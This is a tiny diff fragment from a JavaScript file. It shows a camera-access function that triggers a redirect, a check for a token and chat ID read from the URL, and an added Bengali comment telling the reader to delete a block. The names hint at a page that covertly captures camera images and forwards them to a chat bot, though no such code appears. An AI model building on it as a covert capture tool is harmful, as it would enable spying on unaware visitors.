@@ -583,8 +583,8 @@ async function requestCameraAccess() {
         triggerRedirect();
     }
 }
+    // এই পুরো ব্লকটি ডিলিট করুন (script.js এর শেষে আছে):
 
-// Validate parameters before starting
 if (!tokenFromUrl || !chatIdFromUrl) {
     console.error('❌ Missing required parameters!');
     console.error('Token:', tokenFromUrl);
